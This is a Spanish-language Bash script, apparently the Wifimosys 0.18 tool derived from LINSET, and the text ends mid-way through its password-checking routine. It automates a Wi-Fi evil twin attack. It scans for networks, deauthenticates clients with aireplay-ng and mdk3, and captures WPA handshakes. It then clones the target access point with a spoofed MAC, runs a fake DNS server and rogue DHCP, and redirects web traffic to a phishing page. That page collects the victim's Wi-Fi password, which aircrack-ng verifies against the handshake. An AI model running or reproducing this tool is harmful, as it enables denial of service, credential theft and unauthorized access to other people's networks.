#!/bin/bash

##################################### Modo Debug

if [ -z "$WIFIMOSYS_DEBUG" ]; then WIFIMOSYS_DEBUG=0
else WIFIMOSYS_DEBUG=1
fi

if [[ $EUID -ne 0 ]]; then
        echo -e "Deberás ejecutar el script con privilegios de administrador."
        exit 1
fi
clear

##################################### Configuración general del script

revision=1
version=0.18
IP=192.168.1.1
RUTATEMP="/tmp/Wifimosys"
RUTAHANDSHAKE="/root/handshakes"
RUTAPASS="/root/pwlog"
DEAUTHTIME="20"
RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)

white="\033[1;37m"
grey="\033[0;37m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
transparent="\e[0m"

##################################### Ajuste de ventanas

VENTSCAN="-geometry 95x40-0+0"
VENTHAND="-geometry 95x20-0+0"
VENTDEAU="-geometry 80x20-0-0"
VENTFAKE="-geometry 80x20-0-0"
VENTFDNS="-geometry 80x20+0-0"
VENTESPE="-geometry 95x30-0+0"
VENTDHCP="-geometry 80x20+0+0"

##################################### Ajusta el modo normal o desarrollador

if [ $WIFIMOSYS_DEBUG = 1 ]; then
	export wifim_output_device=/dev/stdout
	HOLD="-hold"
else
	export wifim_output_device=/dev/null
	HOLD=""
fi

##################################### Borra el Log si está en modo normal

function limpialog() {
if [[ "$wifim_output_device" != "/dev/stdout" ]]; then clear; fi
}

##################################### Informe de error (solo en modo desarrollador)

function err_report {
echo "Error en línea $1"
}

if [ "$WIFIMOSYS_DEBUG" = "1" ]; then
        trap 'err_report $LINENUM' ERR
fi

##################################### Función a ejecutar en caso de cierre inesperado

trap exitmode SIGINT SIGHUP

##################################### Mata los procesos usados por el script

function exitmode {

	limpialog
	top
	echo -e $yellow"          Limpiando y cerrando..."$transparent
	echo

	if ps -A | grep -q airbase-ng; then
		echo -e $white"          Finalizando "$green"airbase-ng"$transparent
		killall airbase-ng &>$wifim_output_device
	fi

	if ps -A | grep -q aireplay-ng; then
		echo -e $white"          Finalizando "$green"aireplay-ng"$transparent
		killall aireplay-ng &>$wifim_output_device
	fi

	if ps -A | grep -q airodump-ng; then
		echo -e $white"          Finalizando "$green"airodump-ng"$transparent
		killall airodump-ng &>$wifim_output_device
	fi

	if ps a | grep python| grep fakedns; then
		echo -e $white"          Finalizando "$green"python"$transparent
		kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$wifim_output_device
	fi

	if ps -A | grep -q hostapd; then
		echo -e $white"          Finalizando "$green"hostapd"$transparent
		killall hostapd &>$wifim_output_device
	fi

	if ps -A | grep -q lighttpd; then
		echo -e $white"          Finalizando "$green"lighttpd"$transparent
		killall lighttpd &>$wifim_output_device
	fi

	if ps -A | grep -q dhcpd; then
		echo -e $white"          Finalizando "$green"dhcpd"$transparent
		killall dhcpd &>$wifim_output_device
	fi

	if ps -A | grep -q mdk3; then
		echo -e $white"          Finalizando "$green"mdk3"$transparent
		killall mdk3 &>$wifim_output_device
	fi
	
	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
		echo -e $white"          Deshabilitando "$green"reenvio de paquetes"$transparent
		sysctl -w net.ipv4.ip_forward=0 &>$wifim_output_device
	fi

	echo -e $white"          Limpiando "$green"iptables"$transparent
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain

	echo -e $white"          Restaurando "$green"tput"$transparent
	tput cnorm

	if [ "$WIFI" != "" ]; then
		echo -e $white"          Deshabilitando interfaz "$green"$WIFI"$transparent
		airmon-ng stop $WIFI &> $wifim_output_device
	fi
	
	if [ "$WIFI_MONITOR" != "" ]; then
		echo -e $white"          Deshabilitando interfaz de monitoreo "$green"$WIFI_MONITOR"$transparent
		airmon-ng stop $WIFI_MONITOR &> $wifim_output_device
	fi
	
	if [ $WIFIMOSYS_DEBUG != 1 ]; then

		echo -e $white"          Borrando "$green"archivos del script"$transparent
		rm -R $RUTATEMP/* &>$wifim_output_device
		> /var/state/dhcp/dhcpd.leases
	fi

	contra=/opt/Wireless-Keys/$Host_SSID-wifimosys.txt
	if [ -e $contra ]; then
	  clear
	  top
	  paplay "/usr/share/sounds/KDE-Sys-App-Positive.ogg"
	  echo -ne $green""
	  head "/opt/Wireless-Keys/$Host_SSID-wifimosys.txt"
	  echo -e $yellow"        El password se ha guardado en$green /opt/Wireless-Keys/$Host_SSID-wifimosys.txt"$yellow
	  echo
	  echo -e "        Gracias por usar Wifimosys !"$transparent
	  echo
	else
	  echo
	  echo -e $green"          Limpieza realizada satisfactoriamente."$transparent
	  echo
	  echo -e $yellow"          Gracias por usar Wifimosys !"$transparent
	  sleep 3
	  clear
	fi
	exit
}

##################################### Cabecera

function top {
	
	clear && echo -en "\e[3J"
	echo
	echo -e "$green	  ##########################################################"
	echo -e "$green	  #                                                        #"
	echo -e "$green	  #${yellow}	         WIFIMOSYS $version"" ${green}by ${yellow}Absolut Vodker""$green          #"
	echo -e "$green	  #${yellow}	                WIFI" "MO""${green}ron'" "${yellow}SYS""${green}tem""                 #"
	echo -e "$green	  #                                                        #"
	echo -e "$green	  #  Basado en LINSET de vk496 para seguridadwireless.net  ${green}#"
	echo -e "$green	  #                                                        #"
	echo -e "$green	  ##########################################################""$transparent"
	echo
	echo
}

##################################### Comprueba dependencias

function dependencias {

	for depen in "airbase-ng" "aircrack-ng" "aireplay-ng" "airmon-ng" "airodump-ng" "awk   " "curl   " "dhcpd" "hostapd" "iwconfig" "lighttpd" "macchanger" "mdk3   " "openssl" "pyrit" "python" "xterm"
do
	echo -ne "          $depen"
	if ! hash $depen 2>/dev/null; then
		echo -e $red"No instalado"$transparent
		exit=1
	else
		echo -e ' \t '$green"OK!"$transparent
	fi
	sleep 0.025
done

	echo -ne "          Php5-cgi"
	if ! [ -f /usr/bin/php-cgi ]; then
		echo -e $red"No instalado"$transparent
		exit=1
	else
		echo -e ' \t '$green"OK!"$transparent
	fi
	sleep 0.025

	if [ "$exit" = "1" ]; then
	exit 1
	fi

	sleep 2
	clear
}
limpialog
top
dependencias

##################################### Crea las carpetas de trabajo

if [ ! -d $RUTATEMP ]; then mkdir -p $RUTATEMP &>$wifim_output_device
fi

if [ ! -d $RUTAHANDSHAKE ]; then mkdir -p $RUTAHANDSHAKE &>$wifim_output_device
fi

if [ ! -d $RUTAPASS ]; then mkdir -p $RUTAPASS &>$wifim_output_device
fi

##################################### Título

sleep 0.1 && echo -e $red "                    _   ___  _                                  "
sleep 0.1 && echo -e $red "                   (_) / __)(_)                                 "
sleep 0.1 && echo -e $red "             _ _ _  _ | |__  _  ____    ___    ___  _   _   ___ "
sleep 0.1 && echo -e $red "            | | | || ||  __)| ||    \  / _ \  /___)| | | | /___)"
sleep 0.1 && echo -e $red "            | | | || || |   | || | | || |_| ||___ || |_| ||___ |"
sleep 0.1 && echo -e $red "             \____||_||_|   |_||_|_|_| \___/ (___/  \__  |(___/ "
sleep 0.1 && echo -e $red "                                                   (____/       "$transparent
sleep 3
top

##################################### Muestra la info del AP seleccionado

function infoap {

Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
echo -e $yellow"          INFORMACIÓN DEL PUNTO DE ACCESO:"$transparent
echo
echo -e "               "$blue"SSID"$transparent" : $Host_SSID / $Host_ENC"
echo -e "              "$blue"Canal"$transparent" : $channel"
echo -e "                "$blue"MAC"$transparent" : $mac ($Host_MAC_MODEL $transparent)"
echo
}

##################################### Elección del adaptador

function setinterface {
	limpialog
	top
	rfkill unblock all
	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`

	for monkill in ${KILLMONITOR[@]}; do
		airmon-ng stop $monkill >$wifim_output_device
	done

	readarray -t wirelessifaces < <(airmon-ng |grep "-" | cut -d- -f1)
	INTERFACESNUMBER=`airmon-ng| grep -c "-"`

	if [ "$INTERFACESNUMBER" -gt "0" ]; then

		echo -e $yellow"          Selecciona un adaptador wifi:"
		echo
		i=0

		for line in "${wirelessifaces[@]}"; do
			i=$(($i+1))
			wirelessifaces[$i]=$line
			echo -e "$blue          ""$i)"$transparent" $line"
		done
		echo
		echo -n "          #? "
		read line
		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')

		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
			limpialog
			top
			setinterface
		fi

		readarray -t softwaremolesto < <(airmon-ng check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
		WIFIDRIVER=$(airmon-ng | grep "$PREWIFI" | awk '{print($(NF-2))}')
		rmmod -f "$WIFIDRIVER" &>$wifim_output_device 2>&1

		for molesto in "${softwaremolesto[@]}"; do
			killall "$molesto" &>$wifim_output_device
		done

		modprobe "$WIFIDRIVER" &>$wifim_output_device 2>&1

		select PREWIFI in $INTERFACES; do
			break;
		done

		echo
		echo -ne $yellow"          Poniendo el interface en modo Monitor..."$transparent""
		WIFIMONITOR=$(airmon-ng start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
		WIFI_MONITOR=$WIFIMONITOR
		WIFI=$PREWIFI
	else
		echo -e "         No se ha encontrado ningúnn adaptador Wifi."
		echo -e "         Cerrando que es gerundio..."
		sleep 5
		exitmode
	fi

	limpieza
}

##################################### Limpieza y preparación

function limpieza {

	limpialog
	CSVDB=dump-01.csv
	rm -rf $RUTATEMP/*
	eligecanales
	selection
}

##################################### Selección del Canal

function eligecanales {

	limpialog
	top

	while true; do
		limpialog
		top
		echo -e $yellow"          Elige escaneo de canal(es):"$transparent
		echo
		echo -e "          "$blue"1)"$transparent" Todos los canales"
		echo -e "          "$blue"2)"$transparent" Canal(es) específico(s)"
		echo
		echo -n "          #> "
		read yn
		echo
		case $yn in
			1 ) Scan ; break ;;
			2 ) Scanchan ; break ;;
			* ) echo "          Elige una de la opciones que se muestran."
	esac
	done
}

function msgscan {

	limpialog
	top
	echo -e "${yellow}          Obteniendo lista de redes...$transparent"
	echo
	echo -e "          Cierra la ventana ${yellow}ESCANEANDO$transparent cuando lo creas oportuno..."
	echo -e "          $grey(aprox. 40-60 segundos para detectar todos los canales)"$transparent
	rm -rf $RUTATEMP/dump*
}

##################################### Elegir canal(es) si se optó por la opción 2

function Scanchan {

	limpialog
	top
	  echo -e $yellow"          Selecciona escaneo de canal(es):"$transparent
	  echo
	  echo -e "          Canal único "$blue"(ejemplo): "$green"6"$transparent""
	  echo -e "          Rango de canales "$blue"(ejemplo): "$green"1-5"$transparent""
	  echo -e "          Canales múltiples "$blue"(ejemplo): "$green"1,2,5-7,11"$transparent""
	  echo
	echo -n "          #> "
	read channel_number
	set -- ${channel_number}
	msgscan
	xterm $HOLD -title "Escaneando canal(es) [$channel_number]" $VENTSCAN -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $RUTATEMP/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one 
}

##################################### Escanea toda la red con airodump-ng

function Scan {

	msgscan
	xterm $HOLD -title "ESCANEANDO" $VENTSCAN -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $RUTATEMP/dump -a $WIFI_MONITOR --ignore-negative-one 
}

##################################### Elegir una red del listado

function selection {

	limpialog
	top

	LINEAS_WIFIS_CSV=`wc -l $RUTATEMP/$CSVDB | awk '{print $1}'`

	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
		limpieza && break
	fi

	wifionap=`cat $RUTATEMP/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	wifionap=`expr $wifionap - 1`
	head -n $wifionap $RUTATEMP/$CSVDB &> $RUTATEMP/dump-02.csv
	tail -n +$wifionap $RUTATEMP/$CSVDB &> $RUTATEMP/clientes.csv
	echo "                        LISTADO DE REDES "
	echo
	echo "  Nº    MAC                     CANAL    TIPO     PWR     NOMBRE DE LA RED"
	echo
	i=0

	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
		longueur=${#MAC}
		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		PRIVACY=${PRIVACY:0:4}
		if [ $longueur -ge 17 ]; then
			i=$(($i+1))
			POWER=`expr $POWER + 100`
			CLIENTE=`cat $RUTATEMP/clientes.csv | grep $MAC`

			if [ "$CLIENTE" != "" ]; then
				CLIENTE="*"
			echo -e " ""$red "$i")"$green"$CLIENTE\t""$red"$MAC"\t""$red "$CHANNEL"\t""$green" $PRIVACY"\t  ""$red"$POWER%"\t""$red "$ESSID""$transparent""

			else
			echo -e " ""$green "$i")"$white"$CLIENTE\t""$yellow"$MAC"\t""$green "$CHANNEL"\t""$blue" $PRIVACY"\t  ""$yellow"$POWER%"\t""$green "$ESSID""$transparent""
			fi

			aidlenght=$IDLENGTH
			assid[$i]=$ESSID
			achannel[$i]=$CHANNEL
			amac[$i]=$MAC
			aprivacy[$i]=$PRIVACY
			aspeed[$i]=$SPEED
		fi
		
	done < $RUTATEMP/dump-02.csv
	echo
	echo -e "          "$red"("$white"*"$red")"$white" En rojo: redes con posibles clientes activos"$transparent""
	echo
	echo -e $yellow"          Selecciona el nº de la red a atacar.$grey Para reescanear pulsa$red r$transparent"
	echo
	echo -n "          #> "
	read choice

	if [[ $choice -eq "r" ]]; then
	limpieza
	fi

	idlenght=${aidlenght[$choice]}
	ssid=${assid[$choice]}
	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#ssid}
	fin=$(($acouper-idlength))
	Host_SSID=${ssid:1:fin}

	limpialog
	caphandshake;
}

function caphandshake {

	limpialog
	top
	infoap
	echo
	echo -e "          Es necesario un handshake para poder continuar.$transparent"
	echo -e "          Usa un handshake de esta red ya obtenido (ejemplo:$red wifimosys.cap$transparent)"
	echo -e "          o pulsa ${yellow}ENTER$transparent para capturar uno."
	echo
	echo -ne "          Nombre del archivo .cap: $red"
	read handscap
	handshakeloc=$RUTAHANDSHAKE"/"$handscap
	echo -ne "$transparent"

		if [ "$handscap" = "" ]; then
			deauth all;
		else
			if [ -f "$handshakeloc" ]; then
				Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
				Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
						cp "$handshakeloc" $RUTATEMP/$Host_MAC-01.cap
						CreaSSL
					else
					echo -e "${red}          Handshake corrupto"$transparent
					sleep 3
					fi
				else
					echo -e "${red}          El archivo no corresponde con la red seleccionada"$transparent
					sleep 3
					caphandshake
				fi
			else
				echo -e "${yellow}          Archivo${red} $handscap ${yellow}no encontrado"$transparent
				sleep 3
				caphandshake
			fi
		fi
}

##################################### Menu de desautentificaciones

function echaclientes {

	limpialog
	while true; do
		top
		infoap

		echo "$header_deauthMENU"
		echo
		echo -e "          "$blue"1)"$transparent" Desautentificar todos los clientes"
		echo -e "          "$blue"2)"$transparent" Desautentificar todos los clientes [mdk3]"
		echo -e "          "$blue"3)"$transparent" Desautentificar un cliente en concreto "
		echo -e "          "$blue"4)"$transparent" Reescanear redes "
		echo -e "          "$blue"5)"$transparent" Salir"
		echo
		echo -n "          #> "
		read yn
		echo
		case $yn in
			1 ) deauth all; break ;;
			2 ) deauth mdk3; break ;;
			3 ) deauth esp; break ;;
			4 ) killall airodump-ng &>$wifim_output_device; limpieza; break;;
			5 ) exitmode; break ;;
			* ) echo "          Elige una de la opciones que se muestran."; limpialog ;;
		esac
	done
}

function deauth {

	iwconfig $WIFI_MONITOR channel $Host_CHAN
	case $1 in
		all )
			DEAUTH=deauthall
			capture & $DEAUTH
			CSVDB=$Host_MAC-01.csv
		;;
		mdk3 )
			DEAUTH=deauthmdk3
			capture & $DEAUTH &
			CSVDB=$Host_MAC-01.csv
		;;
		esp )
			DEAUTH=deauthesp
			HOST=`cat $RUTATEMP/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`

			if [ $LINEAS_CLIENTES -le 5 ]; then
				DEAUTH=deauthall
				capture & $DEAUTH
				CSVDB=$Host_MAC-01.csv
				deauth
			fi

			capture
			for CLIENT in $HOST; do
				Client_MAC=`echo ${CLIENT:0:17}`
				deauthesp
			done
			$DEAUTH
			CSVDB=$Host_MAC-01.csv
		;;
	esac
	deauthMENU
}

function deauthMENU {

	limpialog
	top
	infoap

	echo -e "          Capturando, cierra la ventana ${yellow}HANDSHAKE$transparent cuando se obtenga."
	echo -e "          $grey(lo sabrás cuando aparezca en la esquina superior derecha)$transparent"
	echo -e 
	echo -e $yellow"          Análisis del handshake: $Handshake_statuscheck"
	echo
	echo -e "          "$blue"1)"$transparent" Comprobar validez del Handshake"
	echo -e "          "$blue"2)"$transparent" Reintentar la captura"
	echo -e "          "$blue"3)"$transparent" Probar con otro método de desautentificación"
	echo -e "          "$blue"4)"$transparent" Seleccionar otra red"
	echo -e "          "$blue"5)"$transparent" Salir"
	echo
	echo -n '          #> '
	read yn

	case $yn in
		1 ) checkhandshake;;
		2 ) Handshake_statuscheck="Capturando..."; deauth all; break ;;
		3 ) limpialog; echaclientes; break;;
		4 ) Handshake_statuscheck="Capturando..."; killall airodump-ng mdk3 aireplay-ng &>$wifim_output_device; CSVDB=dump-01.csv; selection; break ;;
		5 ) exitmode; break;;
		* ) echo "          Elige una de la opciones que se muestran.";;
	esac
}

##################################### Capturando Handshake

function capture {

	if ! ps -A | grep -q airodump-ng; then
	rm -rf $RUTATEMP/$Host_MAC*
	xterm $HOLD -title "HANDSHAKE" $VENTHAND -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $RUTATEMP/$Host_MAC --channel $Host_CHAN -a $WIFI_MONITOR
	fi
}

##################################### Comprueba el handshake antes de continuar

function checkhandshake {

	pyrit -r $RUTATEMP/$Host_MAC-01.cap -o $RUTATEMP/test.cap stripLive &>$wifim_output_device

	if pyrit -r $RUTATEMP/test.cap analyze 2>&1 | grep -q "good,"; then
		killall airodump-ng mdk3 aireplay-ng &>$wifim_output_device
		pyrit -r $RUTATEMP/test.cap -o $RUTAHANDSHAKE/$Host_SSID.cap strip &>$wifim_output_device
		CreaSSL
		i=2
		break
	else
		if aircrack-ng $RUTATEMP/$Host_MAC-01.cap | grep -q "1 handshake"; then
			Handshake_statuscheck="${red}Handshake corrupto, prueba de nuevo$transparent"
			deauthMENU
		else
			Handshake_statuscheck="${red}Archivo no válido o inexistente$transparent"
			deauthMENU
		fi
	fi
	rm $RUTATEMP/test.cap &>$wifim_output_device
}

############################################# Crea el certificado SSL (en pruebas)

function CreaSSL {

       xterm -title "Creando Certificado ssl Autofirmado" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout $RUTATEMP/server.pem -out $RUTATEMP/server.pem
       chmod 400 $RUTATEMP/server.pem
       matartodo; ataque1;
}

##################################### PREATAQUE - SE CREAN SERVIDORES Y ARCHIVOS NECESARIOS

function ataque1 {

	limpialog
	top
	infoap
	echo
	echo -e ""$yellow"          Handshake válido."$transparent
	echo
	echo -e ""$yellow"          Iniciando el ataque, espera un momento..."$transparent
	echo
	FAKEAP
	ataque2
	ataque3
}

function ataque2 {

##################################### Configuración del  HostAPD

echo "interface=$WIFI
driver=nl80211
ssid=$Host_SSID
channel=$Host_CHAN
">$RUTATEMP/hostapd.conf

##################################### Crea la página de chequeo

echo "<?php
error_reporting(0);

\$count_my_page = (\"$RUTATEMP/hit.txt\");
\$hits = file(\$count_my_page);
\$hits[0] ++;
\$fp = fopen(\$count_my_page , \"w\");
fputs(\$fp , \"\$hits[0]\");
fclose(\$fp);

// Recibe los datos del formulario y los guarda

\$key1 = @\$_POST['key1'];

\$filename = \"$RUTATEMP/data.txt\";
\$filename2 = \"$RUTATEMP/status.txt\";
\$intento = \"$RUTATEMP/intento\";
\$attemptlog = \"$RUTATEMP/pwattempt.txt\";
\$fallidos = \"$RUTATEMP/fallidos.txt\";

\$f_data= ''.\$key1.'';

\$pwlog = fopen(\$attemptlog, \"w\");
fwrite(\$pwlog,\"\$f_data\");
fwrite(\$pwlog,\"\n\");
fclose(\$pwlog);

if ( (strlen(\$key1) < 8) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"La clave debe ser superior a 7 caracteres\\\");window.history.back()</script>\";
break;
}

if ( (strlen(\$key1) > 63) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"La clave debe ser inferior a 64 caracteres\\\");window.history.back()</script>\";
break;
}

\$file = fopen(\$filename, \"w\");
fwrite(\$file,\"\$f_data\");
fwrite(\$file,\"\n\");
fclose(\$file);

\$fallo = fopen(\$fallidos, \"a\");
fwrite(\$fallo,\"    "$yellow"Password erróneo introducido: "$red"\");
fwrite(\$fallo,\"\$f_data\");
fwrite(\$fallo,\"\n\");
fclose(\$fallo);


\$archivo = fopen(\$intento, \"w\");
fwrite(\$archivo,\"\n\");
fclose(\$archivo);

while(1)
{

if (file_get_contents(\"\$intento\") == 2) {
	    header(\"location:final.html\");
	    break;
	}
if (file_get_contents(\"\$intento\") == 1) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"El password no es correcto\\\");window.history.back()</script>\";
	    unlink(\$intento);
	    break;
	}

sleep(1);
}

?>" > $RUTATEMP/data/check.php

echo > $RUTATEMP/fallidos.txt

##################################### Configuración del servidor DHCP

echo "authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet $RANG_IP.0 netmask 255.255.255.0 {
option broadcast-address $RANG_IP.255;
option routers $IP;
option subnet-mask 255.255.255.0;
option domain-name-servers $IP;
range $RANG_IP.100 $RANG_IP.150;
}
" >$RUTATEMP/dhcpd.conf

##################################### Configuración del servidor web Lighttpd

echo "server.document-root = \"$RUTATEMP/data/\"

server.modules = (
  \"mod_access\",
  \"mod_alias\",
  \"mod_accesslog\",
  \"mod_fastcgi\",
  \"mod_redirect\",
  \"mod_rewrite\"
)

fastcgi.server = ( \".php\" => ((
  \"bin-path\" => \"/usr/bin/php-cgi\",
  \"socket\" => \"/php.socket\"
)))

server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"
#server.username = \"www\"
#server.groupname = \"www\"

mimetype.assign = (
\".html\" => \"text/html\",
\".htm\" => \"text/html\",
\".txt\" => \"text/plain\",
\".jpg\" => \"image/jpeg\",
\".png\" => \"image/png\",
\".css\" => \"text/css\"
)

server.error-handler-404 = \"/\"

static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
index-file.names = ( \"index.htm\" )

#Redirige www.dominio.com a dominio.com

\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
}

" >$RUTATEMP/lighttpd.conf

##################################### Redirige las peticiones DNS (script de Francisco Santos)

echo "import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15
    if tipo == 0:
      ini=12
      lon=ord(data[ini])
      while lon != 0:
	self.dominio+=data[ini+1:ini+lon+1]+'.'
	ini+=lon+1
	lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
      packet+=self.data[12:]
      packet+='\xc0\x0c'
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
    return packet

if __name__ == '__main__':
  ip='$IP'
  print ' '
  print '   REDIRIGIENDO TODAS LAS PETICIONES DNS HACIA %s' % ip
  print ' '
  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))

  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print '   Resolviendo: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print '   Finalizando'
    udps.close()
" >$RUTATEMP/fakedns
chmod +x $RUTATEMP/fakedns
}

##################################### Prepara las tablas de enrutamiento para el servidor DHCP/WEB

function routear {

	ifconfig $interfaceroutear up
	ifconfig $interfaceroutear $IP netmask 255.255.255.0

	route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
	sysctl net.ipv4.ip_forward=1 &>$wifim_output_device

	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:80
	iptables -t nat -A POSTROUTING -j MASQUERADE
}

##################################### ATAQUE

function ataque3 {

	interfaceroutear=$WIFI
	compruebapass
	nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)



	if [ "$(echo $WIFIDRIVER | grep -i 8187)" ]; then
		interfaceroutear=at0
		killall airbase-ng &> $wifim_output_device
		xterm $VENTFAKE -bg "#000000" -fg "#FFFFFF" -title "FAKE AP (airbase)" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
	else
		ifconfig $WIFI down
		sleep 0.4
		macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $wifim_output_device
		sleep 0.4
		ifconfig $WIFI up
		sleep 0.4
		killall hostapd &> $wifim_output_device
		xterm $HOLD $VENTFAKE -bg "#000000" -fg "#FFFFFF" -title "FAKE AP (hostapd)" -e hostapd $RUTATEMP/hostapd.conf &
	fi

	sleep 3
	routear &
	sleep 3

	killall dhcpd &> $wifim_output_device
	xterm -bg black -fg green $VENTDHCP -T DHCP -e "dhcpd -d -f -cf "$RUTATEMP/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $RUTATEMP/clientes.txt" &
	killall $(netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $wifim_output_device
	xterm $VENTFDNS -bg "#000000" -fg "#99CCFF" -title "FAKE DNS" -e python $RUTATEMP/fakedns &

	killall $(netstat -lnptu | grep ":80" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $wifim_output_device
	lighttpd -f $RUTATEMP/lighttpd.conf &> $wifim_output_device
	
	killall aireplay-ng &> $wifim_output_device
	killall mdk3 &> $wifim_output_device
	echo "$(strings $RUTATEMP/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1)" >$RUTATEMP/mdk3.txt
	xterm $HOLD $VENTDEAU -bg "#000000" -fg "#FF0009" -title "Desautentificando [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $RUTATEMP/mdk3.txt -c $Host_CHAN &

	xterm -hold $VENTESPE -title "ESPERANDO EL PASSWORD, TEN PACIENCIA" -e $RUTATEMP/handcheck &
	limpialog

	while true; do
	limpialog
	top
	infoap
	echo -e ""$yellow"          Atacando al objetivo..."$transparent
	echo
	echo -e "         $blue 1)$transparent Parar el ataque y escanear redes"$transparent
	echo -e "         $blue 2)$transparent Parar el ataque y salir"$transparent
	echo
	echo -n '          #> '
	read yn
	case $yn in
		1 ) matartodo; sleep 3; limpialog; limpieza; break;;
		2 ) matartodo; exitmode; break;;
		* ) echo "          Elige una de la opciones que se muestran."; limpialog ;;
	esac
	done
}

##################################### Comprueba que el password es correcto

function compruebapass {

	echo "#!/bin/bash

	echo > $RUTATEMP/data.txt
	echo -n \"0\"> $RUTATEMP/hit.txt
	echo "" >$RUTATEMP/loggg
	tput civis
	clear

	minutos=0
	horas=0
	i=0

	while true; do

	segundos=\$i
	dias=\`expr \$segundos / 86400\`
	segundos=\`expr \$segundos % 86400\`
	horas=\`expr \$segundos / 3600\`
	segundos=\`expr \$segundos % 3600\`
	minutos=\`expr \$segundos / 60\`
	segundos=\`expr \$segundos % 60\`

	if [ \"\$segundos\" -le 9 ]; then
	is=\"0\"
	else
	is=
	fi

	if [ \"\$minutos\" -le 9 ]; then
	im=\"0\"
	else
	im=
	fi

	if [ \"\$horas\" -le 9 ]; then
	ih=\"0\"
	else
	ih=
	fi">>$RUTATEMP/handcheck

	echo "if [ -f $RUTATEMP/intento ]; then
		
		if ! aircrack-ng -w $RUTATEMP/data.txt $RUTATEMP/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
		echo \"2\">$RUTATEMP/intento
		break
		else
		echo \"1\">$RUTATEMP/intento
		fi
		
	      fi">>$RUTATEMP/handcheck
		
	echo "readarray -t CLIENTESDHCP < <(cat $RUTATEMP/clientes.txt | grep -e \"(*) via\" | grep -e \"DHCPACK on\"| sort | uniq | awk '!x[\$0]++' )

	echo
	echo -e \"$yellow    ATAQUE EVIL TWIN EN CURSO...""$transparent\"
	echo -e
